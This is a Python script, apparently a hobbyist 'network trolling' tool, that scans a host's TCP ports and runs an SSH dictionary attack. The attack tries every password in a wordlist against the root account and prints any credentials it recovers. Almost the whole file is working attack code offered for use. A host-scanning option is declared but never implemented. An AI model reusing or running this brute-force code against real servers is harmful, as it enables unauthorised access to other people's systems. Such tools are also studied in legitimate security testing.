#!/anaconda/bin/python
'''
	Reference: 
	Port scanning: http://www.pythonforbeginners.com/code-snippets-source-code/port-scanner-in-python
	Dictionary attack: https://github.com/forScie/SSHAttacker/blob/master/sshattacker.py
'''
import argparse
import socket, subprocess, sys
import paramiko

parser = argparse.ArgumentParser(description='Network Trolling Tools.')
parser.add_argument('-v', '--verbose', type=bool, default=True, help='Enable debugging and print details')

#Basic information
parser.add_argument('--hostname', type = str, default='localhost')
parser.add_argument('-p', '--port', type=int, default=22)

#Port scanning
parser.add_argument('-sp', '--scan_ports', type=bool, default=False)
parser.add_argument('-r', '--range', type=str, default="0-1025")

#Host scanning
parser.add_argument('-sh', '--scan_hosts', type=bool, default=False)
parser.add_argument('-sub', '--subnet', type=str)


parser.add_argument('-da', '--dictionary_attack', type=bool, default=False)
parser.add_argument('-wl', '--wordlist', type=str, default=None)


args = parser.parse_args()

verbose = args.verbose
breakline = '-'
port = args.port
hostname = args.hostname
max_port = 32767
username = 'root'

def main():
	if args.scan_ports:
		breakpoint = args.range.index(breakline)
		start = int(args.range[:breakpoint])
		end = int(args.range[breakpoint+1:])
		ports = scan_ports(hostname, range(start, end))
	if args.dictionary_attack:
		if args.wordlist is None:
			print('Please provide wordlists')
			sys.exit()
		(username, password) = dictionary_attack(hostname, port, args.wordlist)
		# print(ports)
	# print(hostname)


def scan_ports(hostname, ranges):
	server_ip = socket.gethostbyname(hostname)
	print('Scanning ports for host:'+ hostname)
	print('-'*60)
	try:
		for port_to_scan in ranges:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = sock.connect_ex((hostname, port_to_scan))
			if verbose:
				sys.stdout.write('\rScanning port:%d' % port_to_scan)
			if result == 0:
				print ("\rPort %d:    Open" % port_to_scan)
			sock.close()
		sys.stdout.write('\rFinished Scanning    \n')
	except KeyboardInterrupt:
		print("Scanning canceled")
		sys.exit()
	except socket.gaierror:
	    print('Hostname could not be resolved. Exiting')
	    sys.exit()
	except socket.error:
	    print("Couldn't connect to server")
	    sys.exit()

def dictionary_attack(hostname, port, wordlist):
	ssh = paramiko.client.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	f = None
	try:
		f = open(wordlist, 'r')
	except OSError:
		sys.exit('\n[!] ' + wordlist + ' is not an acceptable file path\n[+] Exiting...\n')
	
	# Attempt count
	count = 0 
	print('Attacking server %s:%d' % (hostname, port))

	# Iterate through password file
	for line in f.readlines():
		password = line.strip('\n')
		count += 1
		if verbose:
			print('[-] Attempt ' + str(count) + ': ' + password + ' ...', end=' ')
		ssh_helper(ssh, hostname, port, username, password, f)
	return username, password

def ssh_helper(ssh, hostname, port, username, password, f):
	try: 
		ssh.connect(hostname, port=port, username=username, password=password)

	# Catch bad creds
	except paramiko.AuthenticationException:
		ssh.close()
		print('Unsuccessful') # Print to attempt notification line

	# Catch target connection failure (generic exception) and clean up
	except OSError:
		f.close()
		ssh.close()
		sys.exit('\n[+] Connection to ' + hostname + ' was unsuccessful (the host is possibly down)\n[+] Exiting...\n')

	# Handle user ctrl+c within function
	except KeyboardInterrupt:
		sys.exit('\n[+] Exiting...\n')

	# Must have found the password!
	else:
		print('Sucessful!')
		print('\n[!] SUCCESS! Creds: ' + username + '@' + hostname + ':' + str(port) + ' Password: ' + password + '\n')
		f.close()
		ssh.close()
		sys.exit(0)



if __name__ == "__main__":
	subprocess.call('clear', shell=True)
	main()